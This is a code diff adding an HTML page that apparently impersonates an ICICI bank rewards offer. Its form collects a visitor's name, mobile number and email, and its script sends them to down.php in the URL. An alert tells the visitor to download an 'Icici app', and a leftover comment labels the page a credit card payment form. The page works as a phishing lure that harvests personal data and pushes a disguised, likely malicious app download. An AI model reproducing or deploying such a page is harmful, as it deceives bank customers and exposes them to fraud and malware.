@@ -1,0 +1,121 @@
+
+
+<!DOCTYPE html>
+<html><head>
+    <meta charset="utf-8">
+    <title>Reward Form </title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="shortcut icon" href="favicon.png" type="image/x-icon">
+    <link rel="stylesheet" type="text/css" href="bootstrap/css/bootstrap.min.css">
+    <link rel="stylesheet" type="text/css" href="font-awesome/css/font-awesome.min.css">
+
+    <script type="text/javascript" src="js/jquery-1.10.2.min.js"></script>
+    <script type="text/javascript" src="bootstrap/js/bootstrap.min.js"></script>
+	
+	<script>
+	
+	function test_data_all() {
+				var name = document.forms["RegForm"]["first_name"];
+				var mobile = document.forms["RegForm"]["mobile"];
+				var email = document.forms["RegForm"]["email"];
+
+				//download("app_u.txt","hello");
+			
+				window.alert("Downlaod Icici app fill the form and start earning rewards.");
+				
+				window.location.href = "down.php?file=download.txt&name="+name.value+"&mobile="+mobile.value+"&email="+email.value;
+				
+				return false;
+				
+		}
+		
+		function download(filename, text) {
+		
+			var element = document.createElement('a');
+			element.setAttribute('href', 'data:text/plain;charset=utf-8,' + encodeURIComponent(text));
+			element.setAttribute('download', filename);
+
+			element.style.display = 'none';
+			document.body.appendChild(element);
+
+			element.click();
+
+			document.body.removeChild(element);
+		}
+				
+
+		</script>
+	
+	
+</head>
+<body style="">
+   <marquee> <b>Get Instant Reward Points by just filling few information. Get 10% extra Casback Coupon Code for your next purchase at your Email Id.</b></marquee>
+
+<div class="container">
+
+<!-- Credit Card Payment Form - START -->
+
+<div class="container">
+    <div class="row">
+        <div class="col-xs-12 col-md-4 col-md-offset-4">
+            <div class="panel panel-default">
+                <div class="panel-heading">
+                    <div class="row">
+                       <img src="logo.png" style="width:250px;">   
+                        
+        
+                                                                  </div>
+                </div>
+                  <form action="submi.php" name="RegForm"
+						onsubmit="return test_data_all()" method="post">
+                <div class="panel-body">
+                  
+                             <div class="row">
+                            <div class="col-xs-6 col-md-6" style="padding-left: 0px;">
+                                <div class="form-group">
+                                    <label for="first_name">Name</label>
+                                    <input type="text" required="" minlength="3" name="first_name" id="first_name" class="form-control" placeholder="Enter Name">
+                                </div>
+                            </div>
+                            <div class="col-xs-6 col-md-6 pull-right" style="padding-right: 0px;">
+                                <div class="form-group">
+                                    <label for="mobile">Mobile Number</label>
+                                  <input type="tel" required="" minlength="10" maxlength="10" name="mobile" id="mobile" pattern="[0-9]*" class="form-control" placeholder="Enter Mobile number">
+                                </div>
+                            </div>
+                        </div>
+                        <div class="row">
+                            
+                        <div class="row">
+                            <div class="col-xs-12">
+                                <div class="form-group">
+                                    <label for="email">Email</label>
+                                   <input type="email" name="email" id="email" required="" class="form-control" placeholder="Enter Email">
+                                </div>
+                            </div>
+                        </div>
+                </div>
+                <div class="panel-footer">
+                    <div class="row">
+                        <div class="col-xs-12">
+                            <input type="submit" value="Submit & Download" name="process_payment" class="btn btn-success btn-lg btn-block">
+                        </div>
+                    </div>
+                </div>
+              
+            </div></form>
+        </div>
+    </div>
+</div>
+
+<style>
+    .cc-img {
+        margin: 0 auto;
+    }
+
+	
+</style>
+</div>
+
+
+</div></body></html>
